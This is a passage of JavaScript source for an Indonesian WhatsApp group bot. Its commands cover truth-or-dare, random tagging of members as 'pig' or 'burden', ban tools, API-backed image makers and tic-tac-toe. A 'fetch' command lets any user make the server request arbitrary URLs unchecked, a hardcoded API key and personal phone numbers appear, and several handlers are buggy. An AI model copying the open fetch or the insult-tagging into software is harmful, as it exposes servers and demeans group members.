                            const kapan = ['Besok', 'Lusa', 'Tadi', '4 Hari Lagi', '5 Hari Lagi', '6 Hari Lagi', '1 Minggu Lagi', '2 Minggu Lagi', '3 Minggu Lagi', '1 Bulan Lagi', '2 Bulan Lagi', '3 Bulan Lagi', '4 Bulan Lagi', '5 Bulan Lagi', '6 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', '6 Tahun Lagi', '1 Abad lagi', '3 Hari Lagi']
                            const koh = kapan[Math.floor(Math.random() * kapan.length)]
                            dha.sendMessage(from, '*Pertanyaan :* ' + kapankah + '\n*Jawaban :* ' + koh, text, {
                                   quoted: mek
                            })
                            break
                     case 'truth':
                            const trut = ['Pernah suka sama siapa aja? berapa lama?', 'Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)', 'apa ketakutan terbesar kamu?', 'pernah suka sama orang dan merasa orang itu suka sama kamu juga?', 'Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?', 'pernah gak nyuri uang nyokap atau bokap? Alesanya?', 'hal yang bikin seneng pas lu lagi sedih apa', 'pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?', 'pernah jadi selingkuhan orang?', 'hal yang paling ditakutin', 'siapa orang yang paling berpengaruh kepada kehidupanmu', 'hal membanggakan apa yang kamu dapatkan di tahun ini', 'siapa orang yang bisa membuatmu sange', 'siapa orang yang pernah buatmu sange', '(bgi yg muslim) pernah ga solat seharian?', 'Siapa yang paling mendekati tipe pasangan idealmu di sini', 'suka mabar(main bareng)sama siapa?', 'pernah nolak orang? alasannya kenapa?', 'Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget', 'pencapaian yang udah didapet apa aja ditahun ini?', 'kebiasaan terburuk lo pas di sekolah apa?']
                            const ttrth = trut[Math.floor(Math.random() * trut.length)]
                            truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
                            dha.sendMessage(from, truteh, image, {
                                   caption: '*Truth*\n\n' + ttrth,
                                   quoted: mek
                            })
                            break
                     case 'dare':
                            const dare = ['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu', 'telfon crush/pacar sekarang dan ss ke pemain', 'pap ke salah satu anggota grup', 'Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo', 'ss recent call whatsapp', 'drop emot "??💨" setiap ngetik di gc/pc selama 1 hari', 'kirim voice note bilang can i call u baby?', 'drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu', 'pake foto sule sampe 3 hari', 'ketik pake bahasa daerah 24 jam', 'ganti nama menjadi "gue anak lucinta luna" selama 5 jam', 'chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you', 'prank chat mantan dan bilang " i love u, pgn balikan', 'record voice baca surah al-kautsar', 'bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini', 'sebutkan tipe pacar mu!', 'snap/post foto pacar/crush', 'teriak gajelas lalu kirim pake vn kesini', 'pap mukamu lalu kirim ke salah satu temanmu', 'kirim fotomu dengan caption, aku anak pungut', 'teriak pake kata kasar sambil vn trus kirim kesini', 'teriak " anjimm gabutt anjimmm " di depan rumah mu', 'ganti nama jadi " BOWO " selama 24 jam', 'Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
                            const der = dare[Math.floor(Math.random() * dare.length)]
                            buffer = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
                            dha.sendMessage(from, buffer, image, {
                                   quoted: mek,
                                   caption: '*Dare*\n\n' + der
                            })
                            break
                     case 'jadian':
                            jds = []
                            jdii = groupMembers
                            koss = groupMembers
                            akuu = jdii[Math.floor(Math.random() * jdii.length)]
                            diaa = koss[Math.floor(Math.random() * koss.length)]
                            teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]}  (♥️ ) @${diaa.jid.split('@')[0]} `
                            jds.push(akuu.jid)
                            jds.push(diaa.jid)
                            mentions(teks, jds, true)
                            break
                     case 'cantik':
                            membr = []
                            const mes = groupMembers
                            const msk = groupMembers
                            const siaps = mes[Math.floor(Math.random() * mes.length)]
                            const sips = pushname[Math.floor(Math.random() * msk.length)]
                            teks = `*Yang Paling Cantik Disini Adalah :* @${siaps.jid.split('@')[0]}`
                            membr.push(siaps.jid)
                            mentions(teks, membr, true)
                            break
                     case 'ganteng':
                            membr = []
                            const nus = groupMembers
                            const msl = groupMembers
                            const siapss = nus[Math.floor(Math.random() * nus.length)]
                            const sipss = pushname[Math.floor(Math.random() * msl.length)]
                            teks = `*Masih Gantengan Owner Gua :* @${siapss.jid.split('@')[0]}`
                            membr.push(siapss.jid)
                            mentions(teks, membr, true)
                            break
                     case 'babi':
                            membr = []
                            const meg = groupMembers
                            const mge = groupMembers
                            const ba = meg[Math.floor(Math.random() * meg.length)]
                            const bi = pushname[Math.floor(Math.random() * mge.length)]
                            teks = `*Yang Paling Babi Disini Adalah :* @${ba.jid.split('@')[0]}`
                            membr.push(ba.jid)
                            mentions(teks, membr, true)
                            break
                     case 'beban':
                            membr = []
                            const nge = groupMembers
                            const tod = groupMembers
                            const beb = nge[Math.floor(Math.random() * nge.length)]
                            const an = pushname[Math.floor(Math.random() * tod.length)]
                            teks = `*Yang Paling Beban Disini Adalah :* @${beb.jid.split('@')[0]}`
                            membr.push(beb.jid)
                            mentions(teks, membr, true)
                            break
                            //------------------< Lainnya >-------------------

                     case 'ban':
                            dha.updatePresence(from, Presence.composing)
                            if (args.length < 1) return
                            if (!isOwner) return reply(mess.only.owner)
                            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                            ban = mentioned
                            reply(`berhasil banned : ${ban}`)
                            break
                     case 'unban':
                            if (!isOwner) return reply(mess.only.owner)
                            bnnd = body.slice(8)
                            ban.splice(`${bnnd}@s.whatsapp.net`, 1)
                            reply(`Nomor wa.me/${bnnd} telah di unban!`)
                            break
                     case 'getpp':
                            if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
                                   linkpp = await dha.getProfilePicture(from) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
                                   buffer = await getBuffer(linkpp)
                                   dha.sendMessage(from, buffer, image, {
                                          caption: "Nih",
                                          quoted: mek
                                   })
                            } else if (mek.message.extendedTextMessage.contextInfo.mentionedJid === null || mek.message.extendedTextMessage.contextInfo.mentionedJid === undefined) {
                                   mberr = mek.message.extendedTextMessage.contextInfo.participant
                                   linkpp = await dha.getProfilePicture(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
                                   buffer = await getBuffer(linkpp)
                                   dha.sendMessage(from, buffer, image, {
                                          quoted: mek,
                                          caption: `Profile Picture of @${mberr.split("@")[0]}`,
                                          contextInfo: {
                                                 "mentionedJid": [mberr]
                                          }
                                   })
                            } else if (mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0) {
                                   mberr = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                                   linkpp = await dha.getProfilePicture(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
                                   buffer = await getBuffer(linkpp)
                                   dha.sendMessage(from, buffer, image, {
                                          quoted: mek,
                                          caption: `Profile Picture of @${mberr.split("@")[0]}`,
                                          contextInfo: {
                                                 "mentionedJid": [mberr]
                                          }
                                   })
                            }
                            break
                     case 'd':
                     case 'del':
                     case 'delete': // MR.CYSER
                            try {
                                   if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply chat bot')
                                   dha.deleteMessage(from, {
                                          id: mek.message.extendedTextMessage.contextInfo.stanzaId,
                                          remoteJid: from,
                                          fromMe: true
                                   })
                            } catch (e) {
                                   reply('Reply chat bot')
                            }
                            break
                     case 'tes':
                            reply('Okeh nyala')
                            break
                     case 'info': // Jangan Di Ubah Plise
                            urlinfo = 'https://i.postimg.cc/L4wjFw1q/IMG-20210929-WA0233.jpg'
                            thankslort = `*━━━━INFO BOT━━━━*\n*O>Nama : hzkyx Botz*\n*O>JAM : ${moment().utcOffset('+0700').format('HH:mm')}*\n*O>DATE : ${moment.tz('Asia/Jakarta').format('DD/MM')}*\n*O>Tipe : Node Js*\n*O>Versi : 3.3*\n*━━━━━━━━━━━━━━━*`
                            dha.sendMessage(from, await getBuffer(urlinfo), image, {
                                   quoted: mek,
                                   caption: thankslort
                            })
                            break
                     case 'get':
                     case 'fetch': //ambil dari nuru
                            if (!/^https?:\/\//.test(q)) return reply('Awali *URL* dengan http:// atau https://')
                            res = await fetch(q)
                            if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
                                   delete res
                                   throw `Content-Length: ${res.headers.get('content-length')}`
                            }
                            if (!/text|json/.test(res.headers.get('content-type'))) return sendMediaURL(from, q)
                            txtx = await res.buffer()
                            try {
                                   txtx = util.format(JSON.parse(txtx + ''))
                            } catch (e) {
                                   txtx = txtx + ''
                            } finally {
                                   reply(txtx.slice(0, 65536) + '')
                            }
                            break
                     case 'searchmsg':
                     case 'caripesan': //by ANU TEAM
                            if (args.length < 1) return reply(`Pesan Yang Mau Dicari Apaan?\nContoh : ${prefix + command} halo|10`)
                            teks = arg
                            if (teks.includes("|")) {
                                   try {
                                          var ve = teks.split("|")[0]
                                          var za = teks.split("|")[1]
                                          sampai = `${za}`
                                          if (isNaN(sampai)) return reply('Harus berupa Angka!')
                                          batas = parseInt(sampai) + 1
                                          if (batas > 30) return reply('Maks 30!')
                                          reply(mess.wait)
                                          cok = await dha.searchMessages(`${ve}`, from, batas, 1)
                                          if (cok.messages.length < 2) return reply('Tidak Ditemukan Pesan')
                                          if (cok.messages.length < parseInt(batas)) reply(`Hanya Ditemukan ${cok.messages.length - 1} Pesan`)
                                          for (i = 1; i < cok.messages.length; i++) {
                                                 if (cok.messages[i].message) {
                                                        dha.sendMessage(from, `Ditemukan!`, text, {
                                                               sendEphemeral: true,
                                                               quoted: cok.messages[i]
                                                        })
                                                 }
                                          }
                                   } catch (e) {
                                          return reply(String(e))
                                   }
                            } else {
                                   reply(`Format salah tod, ini contoh format yang benar : ${prefix + command} halo|10`)
                            }
                            break
                     case 'lolkey':
                     case 'cekapikey':
                            if (args.length < 1) return reply(`Ketik ${prefix}lolkey [Apikeynya]`)
                            anu = await fetchJson(`https://lolhuman.herokuapp.com/api/checkapikey?apikey=${q}`)
                            teks = `*YOUR APIKEY*\n\n➸ Ussername= ${anu.result.username}\n➸ Request= ${anu.result.requests}\n➸ Today= ${anu.result.today}\n➸ Akun Type= ${anu.result.account_type}\n➸ Expired= ${anu.result.expired}\n➸ API = https://lolhuman.herokuapp.com`
                            dha.sendMessage(from, teks, text, {
                                   quoted: troli
                            })
                            break
                     case 'bugreport':
                            if (args.length < 1) return reply(`Ketik ${prefix}bugreport [fiturnya] [Error Nya Gimana]`)
                            teks = args.join(' ')
                            reply('Terima Kasih Telah Melaporkan Bug Pada Owner, Jika Itu Sekedar Iseng Maka Akan Di Ban Oleh Bot!')
                            dha.sendMessage('6282287486762@s.whatsapp.net', `*Bug Report:* ${teks}`, text)
                            break
                     case 'readall':
                            totalchat.map(async ({
                                   jid
                            }) => {
                                   await dha.chatRead(jid)
                            })
                            reply(`\`\`\`Berhasil membaca ${unread.length} Chat !\`\`\``)
                            console.log(totalchat.length)
                            break
                            //------------------< serti menu >-------------------   
                     case 'sertitolol':
                            if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}tololserti KURR GAMTENG`)
                            ct = body.slice(12)
                            zhain = await getBuffer(`https://api.lolhuman.xyz/api/toloserti?apikey=${setting.lolkey}&name=${ct}`)
                            dha.sendMessage(from, zhain, image, {
                                   quoted: mek,
                                   caption: 'Nih Dah Jadi'
                            })
                            break
                            //------------------< cerita menu >-------------------
                     case 'cerpen':

                            get_result = await fetchJson(`http://api.lolhuman.xyz/api/cerpen?apikey=${setting.lolkey}`)
                            get_result = get_result.result
                            ini_txt = `Title : ${get_result.title}\n`
                            ini_txt += `Creator : ${get_result.creator}\n`
                            ini_txt += `Story :\n${get_result.cerpen}`
                            reply(ini_txt)
                            break
                     case 'ceritahoror':
                            get_result = await fetchJson(`http://api.lolhuman.xyz/api/ceritahoror?apikey=${setting.lolkey}`)
                            get_result = get_result.result
                            ini_txt = `Title : ${get_result.title}\n`
                            ini_txt += `Desc : ${get_result.desc}\n`
                            ini_txt += `Story :\n${get_result.story}\n`
                            thumbnail = await getBuffer(get_result.thumbnail)
                            dha.sendMessage(from, thumbnail, image, {
                                   quoted: mek,
                                   caption: ini_txt
                            })
                            break
                            //------------------(KATA KATA MENU)---------+--------
                     case 'quotes':
                            quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotes?apikey=${setting.lolkey}`)
                            quotes = quotes.result
                            author = quotes.by
                            quotes = quotes.quote
                            reply(`_${quotes}_\n\n*― ${author}*`)
                            break
                     case 'quotesanime':
                            quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=${setting.lolkey}`)
                            quotes = quotes.result
                            quote = quotes.quote
                            char = quotes.character
                            anime = quotes.anime
                            episode = quotes.episode
                            reply(`_${quote}_\n\n*― ${char}*\n*― ${anime} ${episode}*`)
                            break
                     case 'quotesdilan':
                            quotedilan = await fetchJson(`https://api.lolhuman.xyz/api/quotes/dilan?apikey=${setting.lolkey}`)
                            reply(quotedilan.result)
                            break
                     case 'faktaunik':
                     case 'katabijak':
                     case 'pantun':
                     case 'bucin':
                            get_result = await fetchJson(`https://api.lolhuman.xyz/api/random/${command}?apikey=${setting.lolkey}`)
                            reply(get_result.result)
                            break
                            //------------------< Maker Menu >--------------------   
                     case 'tahta':
                            if (args.length == 0) return reply(`Usage: ${prefix} + command} text\nExample: ${prefix + command} NOIR`)
                            teks = args.join(" ")
                            reply('SABAR YA SAYANG....')
                            buffer = await getBuffer(`https://api.lolhuman.xyz/api/hartatahta?apikey=genbotkey&text=${teks}`)
                            dha.sendMessage(from, buffer, image, {
                                   quoted: ftoko,
                                   caption: 'ini hasilnya kak....'
                            })
                            break
                     case 'pornhub':
                            if (args.length == 0) return reply(`Contoh: ${prefix + command} NOIR BOT`)
                            txt1 = args[0]
                            txt2 = args[1]
                            ini_anu = await getBuffer(`http://api.lolhuman.xyz/api/textprome2/pornhub?apikey=genbotkey&text1=${txt1}&text2=${txt2}`)
                            dha.sendMessage(from, ini_anu, image, {
                                   quoted: ftoko
                            })
                            break
                     case 'cup':
                            if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                            ini_txt = args.join(" ")
                            getBuffer(`https://api.lolhuman.xyz/api/photooxy1/cup?apikey=${setting.lolkey}&text=${ini_txt}`).then((gambar) => {
                                   dha.sendMessage(from, gambar, image, {
                                          quoted: troli
                                   })
                            })
                            break
                     case 'coffe':
                            if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                            ini_txt = args.join(" ")
                            getBuffer(`https://api.lolhuman.xyz/api/photooxy1/coffe?apikey=${setting.lolkey}&text=${ini_txt}`).then((gambar) => {
                                   dha.sendMessage(from, gambar, image, {
                                          quoted: troli,
                                          caption: 'jangan lupa bayar 15.000'
                                   })
                            })
                            break
                     case 'cup1':
                            if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                            ini_txt = args.join(" ")
                            getBuffer(`https://api.lolhuman.xyz/api/photooxy1/cup1?apikey=${setting.lolkey}&text=${ini_txt}`).then((gambar) => {
                                   dha.sendMessage(from, gambar, image, {
                                          quoted: troli
                                   })
                            })
                            break

                     case 'wetglass':
                     case 'multicolor3d':
                     case 'watercolor':
                     case 'luxurygold':
                     case 'galaxywallpaper':
                     case 'lighttext':
                     case 'beautifulflower':
                     case 'puppycute':
                     case 'royaltext':
                     case 'heartshaped':
                     case 'birthdaycake':
                     case 'galaxystyle':
                     case 'hologram3d':
                     case 'greenneon':
                     case 'glossychrome':
                     case 'greenbush':
                     case 'metallogo':
                     case 'noeltext':
                     case 'glittergold':
                     case 'textcake':
                     case 'starsnight':
                     case 'wooden3d':
                     case 'textbyname':
                     case 'writegalacy':
                     case 'galaxybat':
                     case 'snow3d':
                     case 'birthdayday':
                     case 'goldplaybutton':
                     case 'silverplaybutton':
                     case 'freefire':
                            if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                            ini_txt = args.join(" ")
                            getBuffer(`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${setting.lolkey}&text=${ini_txt}`).then((gambar) => {
                                   dha.sendMessage(from, gambar, image, {
                                          quoted: ftoko
                                   })
                            })
                            break

                            //------------------< enable/disable>-------------------
                     case 'leveling':
                            if (!isGroup) return reply(mess.only.group)
                            if (ar[0] === 'enable') {
                                   if (isLevelingOn) return reply('Fitur leveling telah diaktifkan sebelumnya.')
                                   _leveling.push(from)
                                   fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
                                   reply('Fitur leveling berhasil diaktifkan.')
                            } else if (ar[0] === 'disable') {
                                   var anup = _leveling.indexOf(from)
                                   _leveling.splice(anup, 1)
                                   fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
                                   reply('Fitur leveling berhasil dimatikan.')
                            } else {
                                   reply('Pilih enable atau disable!')
                            }
                            break
                     case 'antilink':
                            if (!isGroup) return reply(mess.only.group)
                            if (!isBotGroupAdmins) return reply(`Bot Harus jadi Admin`)
                            if (!q) return reply(`Pilih enable atau disable`)
                            if (args[0].toLowerCase() === 'enable') {
                                   if (isAntiLink) return reply(`Udah aktif`)
                                   antilink.push(from)
                                   fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))
                                   reply('*「 ANTILINK DI AKTIFKAN 」*\n\nYang Ngirim Link Group Bakal Ke Kick!')
                            } else if (args[0].toLowerCase() === 'disable') {
                                   let anu = antilink.indexOf(from)
                                   antilink.splice(anu, 1)
                                   fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))
                                   reply('*「 ANTILINK DI NONAKTIFKAN 」*')
                            } else {
                                   reply(`Pilih enable atau disable`)
                            }
                            break
                     case 'welcome':
                            if (!isGroup) return reply(mess.only.group)
                            if (args.length < 1) return reply('!welcome enable/disable')
                            if ((args[0]) === 'enable') {
                                   if (isWelkom) return reply('Udah aktif')
                                   welkom.push(from)
                                   fs.writeFileSync('./database/group/welcome.json', JSON.stringify(welkom))
                                   reply('Sukses mengaktifkan fitur welcome di group ini ✔️')
                            } else if ((args[0]) === 'disable') {
                                   welkom.splice(from, 1)
                                   fs.writeFileSync('./database/group/welcome.json', JSON.stringify(welkom))
                                   reply('Sukses menonaktifkan fitur welcome di group ini ✔️')
                            } else {
                                   reply('Enable untuk mengaktifkan, disable untuk menonaktifkan')
                            }
                            break
                     case 'mute':
                            if (!isGroup) return reply(mess.only.group)
                            if (!isGroupAdmins) return reply(mess.only.admin)
                            if (args.length < 1) return reply('!mute enable/disable')
                            if (args[0].toLowerCase() === 'enable') {
                                   if (isMuted) return reply(`udah di mute`)
                                   mute.push(from)
                                   fs.writeFileSync('./database/group/mute.json', JSON.stringify(mute))
                                   reply(`*...:* *MUTE ON* *:...*\n\nPerhatian untuk member grup\nBot telah di mute di grup ${groupName} , Silahkan menggunakan bot dengan sewajarnya\n\n_*${botName}*_`)
                            } else if (args[0].toLowerCase() === 'disable') {
                                   anu = mute.indexOf(from)
                                   mute.splice(anu, 1)
                                   fs.writeFileSync('./database/group/mute.json', JSON.stringify(mute))
                                   reply(`*...:* *𝙈𝙐𝙏𝙀 𝙊𝙁𝙁* *:...*\n\nPerhatian untuk member grup\nBot telah di unmute di grup ${groupName} , Silahkan menggunakan bot dengan sewajarnya\n\n_*${botName}*_`)
                            } else {
                                   reply(`Pilih enable atau disable`)
                            }
                            break
                     case 'grupsetting':
                     case 'groupsetting':
                            if (!isGroup) return reply(mess.only.group)
                            if (!isGroupAdmins) return reply(mess.only.admin)
                            list = []
                            com = [`group buka`, `leveling enable`, `welcome enable`, `antilink enable`, `mute enable`]
                            comm = [`group tutup`, `leveling disable`, `welcome disable`, `antilink disable`, `mute disable`]
                            listnya = [`Group open/close`, `Leveling enable/disable`, `Welcome enable/disable`, `Antilink enable/disable`, `Mute enable/disable`]
                            suruh = [`Enable`, `Disable`]
                            fiturname = [`Group`, `Leveling`, `Welcome`, `Antilink`, `Mute`]
                            startnum = 0;
                            let startnu = 0;
                            let startn = 0;
                            let start = 0
                            startnumm = 1
                            for (let x of com) {
                                   var yy = {
                                          title: `${listnya[startnum++]}`,
                                          rows: [{
                                                 title: `${suruh[0]}`,
                                                 description: `\nMengaktifkan ${fiturname[startnu++]}`,
                                                 rowId: `${prefix}${x}`
                                          }, {
                                                 title: `${suruh[1]}`,
                                                 description: `\nMenonaktifkan ${fiturname[startn++]}`,
                                                 rowId: `${prefix}${comm[start++]}`
                                          }]
                                   }
                                   list.push(yy)
                            }
                            listmsg(from, `Group Setting`, `Atur Settingan Grup anda disini......`, list)

                            break
                     case 'group':
                            if (!isGroup) return reply(ind.groupo())
                            if (!isGroupAdmins) return reply(ind.admin())
                            if (!isBotGroupAdmins) return reply(ind.badmin())
                            if (args[0] === 'buka') {
                                   reply(`*BERHASIL MEMBUKA GROUP*`)
                                   dha.groupSettingChange(from, GroupSettingChange.messageSend, false)
                            } else if (args[0] === 'tutup') {
                                   reply(`*BERHASIL MENUTUP GROUP*`)
                                   dha.groupSettingChange(from, GroupSettingChange.messageSend, true)
                            }
                            break
                            //------------------< Menunya Bang:v >-------------------
                     case 'dana':
                            reply(`DANA : 081220670449\n\n SAYA CUMAN BISA BILANG TERIMAKASIH ATAS KEMURAHAN HATI TUAN TELAH MEMBERIKAN KAMI BANTUAN.SEMOGA ALLAH MEMBALAS APA YG TUAN BERIKAN KE PADA SAYA`)
                            break
                     case 'gopay':
                            reply(`GOPAY : 081220670449\n\n SAYA CUMAN BISA BILANG TERIMAKASIH ATAS KEMURAHAN HATI TUAN TELAH MEMBERIKAN KAMI BANTUAN.SEMOGA ALLAH MEMBALAS APA YG TUAN BERIKAN KE PADA SAYA`)
                            break
                     case 'pulsa':
                            reply(`PULSA : 081220670449\n\n SAYA CUMAN BISA BILANG TERIMAKASIH ATAS KEMURAHAN HATI TUAN TELAH MEMBERIKAN KAMI BANTUAN.SEMOGA ALLAH MEMBALAS APA YG TUAN BERIKAN KE PADA SAYA`)
                            break
                     case 'infoig':
                            reply(`Jangan Lupa Follow Ig Owner Ya : https://www.instagram.com/kurrsadboy`)
                            break
                     case 'grupbot':
                            reply('https://chat.whatsapp.com/EymjfVUattCJSGg58WPvrd')
                            break
                     case 'ownermenu':
                            dha.sendMessage(from, ownerMenu(prefix), MessageType.text, {
                                   quoted: troli
                            })
                            break
                     case 'downloadmenu':
                            dha.sendMessage(from, downloadMenu(prefix), MessageType.text, {
                                   quoted: troli
                            })
                            break
                     case 'gamemenu':
                            dha.sendMessage(from, gameMenu(prefix), MessageType.text, {
                                   quoted: troli
                            })
                            break
                     case 'rules':
                            dha.sendMessage(from, rulesBot(prefix), MessageType.text, {
                                   quoted: troli
                            })
                            break
                     case 'owner':
                            dha.sendMessage(from, owner(prefix), MessageType.text, {
                                   quoted: troli
                            })
                            break
                     case 'wibumenu':
                            dha.sendMessage(from, wibuMenu(prefix), MessageType.text, {
                                   quoted: troli
                            })
                            break
                     case 'infomenu':
                            dha.sendMessage(from, infoMenu(prefix), MessageType.text, {
                                   quoted: troli
                            })
                            break
                     case 'stickermenu':
                            dha.sendMessage(from, stickerMenu(prefix), MessageType.text, {
                                   quoted: troli
                            })
                            break
                     case 'sertimenu':
                            dha.sendMessage(from, sertiMenu(prefix), MessageType.text, {
                                   quoted: troli
                            })
                            break
                     case 'ceritamenu':
                            dha.sendMessage(from, ceritaMenu(prefix), MessageType.text, {
                                   quoted: troli
                            })
                            break
                     case 'makermenu':
                            dha.sendMessage(from, makerMenu(prefix), MessageType.text, {
                                   quoted: troli
                            })
                            break
                     case 'toolsmenu':
                            dha.sendMessage(from, toolsMenu(prefix), MessageType.text, {
                                   quoted: troli
                            })
                            break
                     case 'dewasamenu':
                            dha.sendMessage(from, dewasaMenu(prefix), MessageType.text, {
                                   quoted: troli
                            })
                            break
                     case 'othermenu':
                            dha.sendMessage(from, otherMenu(prefix), MessageType.text, {
                                   quoted: troli
                            })
                            break
                     case 'groupmenu':
                     case 'grupmenu':
                            dha.sendMessage(from, groupMenu(prefix), MessageType.text, {
                                   quoted: troli
                            })
                            break
                     case 'funmenu':
                            dha.sendMessage(from, funMenu(prefix), MessageType.text, {
                                   quoted: troli
                            })
                            break

                     default:
                            if (fs.existsSync(`./media/${from}.json`)) {
                                   gelutSkuy = setGelud(`${from}`)
                                   if (sender == `${gelutSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
                                          if (gelutSkuy.status) return reply(`Game telah dimulai sebelumnya!`)
                                          gelutSkuy.status = true
                                          rand0m = [gelutSkuy.Z, gelutSkuy.Y]
                                          winR = rand0m[Math.floor(Math.random() * rand0m.length)]
                                          fs.writeFileSync(`./media/${from}.json`, JSON.stringify(gelutSkuy, null, 2))
                                          starGame = `👑 Gelud Game 🤙🏻 

Diantara @${gelutSkuy.Z} & @${gelutSkuy.Y}
• Pemenangnya adalah [ @${winR} ] `
                                          dha.sendMessage(from, starGame, text, {
                                                 quoted: troli,
                                                 contextInfo: {
                                                        mentionedJid: [winR + "@s.whatsapp.net", gelutSkuy.Z + "@s.whatsapp.net", gelutSkuy.Y + "@s.whatsapp.net", ]
                                                 }
                                          })
                                          fs.unlinkSync("./media/" + from + ".json");
                                   } else if (sender == `${gelutSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'n') {
                                          dha.sendMessage(from, `👑 Game Gelud Rejected 🤙🏻
• @${gelutSkuy.Y} Menolak🤙🏻`, text, {
                                                 quoted: troli,
                                                 contextInfo: {
                                                        mentionedJid: [gelutSkuy.Y + "@s.whatsapp.net"]
                                                 }
                                          })
                                          fs.unlinkSync("./media/" + from + ".json");
                                   }
                            }

                            if (isTTT && isPlayer2) {
                                   if (budy.startsWith('Y')) {
                                          tto = ky_ttt.filter(ghg => ghg.id.includes(from))
                                          tty = tto[0]
                                          angka = tto[0].angka
                                          ucapan =
                                                 `*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=❎
Player2 @${tty.player2.split('@')[0]}=⭕

Giliran = @${tty.player1.split('@')[0]}

   ${angka[1]}${angka[2]}${angka[3]}
   ${angka[4]}${angka[5]}${angka[6]}
   ${angka[7]}${angka[8]}${angka[9]}`
                                          dha.sendMessage(from, ucapan, text, {
                                                 quoted: troli,
                                                 contextInfo: {
                                                        mentionedJid: [tty.player1, tty.player2]
                                                 }
                                          })
                                   }
                                   if (budy.startsWith('N')) {
                                          tto = ky_ttt.filter(ghg => ghg.id.includes(from))
                                          tty = tto[0]
                                          naa = ky_ttt.filter(toek => !toek.id.includes(from))
                                          ky_ttt = naa
                                          dha.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Menolak:(`, text, {
                                                 quoted: troli,
                                                 contextInfo: {
                                                        mentionedJid: [tty.player2]
                                                 }
                                          })
                                   }
                            }

                            if (isTTT && isPlayer1) {
                                   nuber = parseInt(budy)
                                   if (isNaN(nuber)) return
                                   if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
                                   main = ky_ttt.filter(hjh => hjh.id.includes(from))
                                   if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
                                   if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
                                   s = '❎'
                                   main[0].angka[nuber] = s
                                   main[0].gilir = main[0].player1
                                   naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
                                   ky_ttt = naa
                                   pop = main[0]
                                   ky_ttt.push(pop)
                                   tto = ky_ttt.filter(hgh => hgh.id.includes(from))
                                   tty = tto[0]
                                   angka = tto[0].angka
                                   ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

                                   ucapmenang = () => {
                                          ucapan1 =
                                                 `*🎳Result Game Tictactoe 🎲*

*Yeyyy Permainan Di Menangkan Oleh* @${tty.player1.split('@')[0]}\n
*Ingin bermain lagi? ${prefix}tictactoe*`
                                          ucapan2 = `*🎳Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
                                          dha.sendMessage(from, ucapan1, text, {
                                                 quoted: troli,
                                                 contextInfo: {
                                                        mentionedJid: [tty.player1]
                                                 }
                                          })
                                          naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
                                          return ky_ttt = naa
                                   }

                                   if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()

                                   if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()

                                   if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()

                                   if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()

                                   if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()

                                   if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()

                                   if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()

                                   if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()

                                   if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && !ttt.includes('4️⃣') && !
                                          ttt.includes('5️⃣') && !
